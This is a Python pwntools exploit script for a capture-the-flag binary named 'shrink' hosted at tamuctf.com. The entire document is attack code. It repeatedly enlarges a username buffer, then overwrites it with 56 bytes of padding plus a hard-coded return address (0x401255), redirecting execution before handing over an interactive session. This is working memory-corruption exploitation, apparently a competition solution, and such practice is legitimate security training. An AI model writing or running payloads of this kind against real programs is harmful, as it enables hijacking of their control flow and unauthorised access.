#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./shrink")
# p = elf.process()
p = remote("tamuctf.com", 443, ssl=True, sni="shrink")
# gdb.attach(p,gdbscript='b* _ZN8Username5printEv+27')

def increase_length():
    p.sendlineafter("4. Exit\n","3")

def change_username(name):
    p.sendlineafter("4. Exit\n","2")
    p.recvline()
    p.sendline(name)

def print_name():
    p.sendlineafter("4. Exit\n","1")

for i in range(50):
    increase_length()

change_username("aaaabbbb")
print_name()
change_username(b"a"*56+p64(0x0000000000401255))
p.sendline("5")
p.interactive()